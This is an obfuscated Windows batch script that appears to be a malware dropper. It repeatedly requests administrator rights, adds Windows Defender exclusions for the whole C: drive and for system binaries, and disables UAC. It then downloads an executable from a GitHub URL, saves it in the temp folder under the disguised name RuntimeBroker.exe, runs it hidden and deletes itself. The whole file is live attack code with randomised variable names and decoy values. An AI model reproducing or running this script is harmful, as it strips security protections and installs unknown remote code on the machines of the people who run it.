@echo off & setlocal enableDelayedExpansion
set "AJcu=2>&1" & set "Zbew=>nul" & set "PZk=SESSION" & set "Nvpk=NET"
%Nvpk% %PZk% %Zbew% %AJcu%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "lWOz=baz" & set "tUhuk=foo" & set "BCfC=qux" & set "mke=bar" & rem oXdSquJ xwmw YhSl
set "Mcu=powershell -ExecutionPolicy Bypass -Command"
set "UbPi=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
set "jcjrE='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
set "DLh='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
!Mcu! "!UbPi! !jcjrE! !DLh!" %Zbew% %AJcu%
set "lrsH=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
set "kHWFi=-Name 'EnableLUA' -Value 0"
!Mcu! "!lrsH! !kHWFi!" %Zbew% %AJcu%
set "gZkBu=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
!Mcu! "!gZkBu!" %Zbew% %AJcu%
if !errorlevel! neq 0 (goto %a%)
set "kMA=timeout /t" & !kMA! 2 %Zbew% %AJcu%
set "Irp=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
set "OoUSF=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
set "dhV=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!Mcu! "!Irp! !OoUSF! !dhV!" %Zbew% %AJcu%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!kMA! 1 %Zbew% %AJcu% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %Zbew% %AJcu%
del /f /q "%~f0" %Zbew% %AJcu%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %Zbew% %AJcu%
if !errorlevel! neq 0 (!kMA! 3 %Zbew% %AJcu% & goto %b%)
exit /b
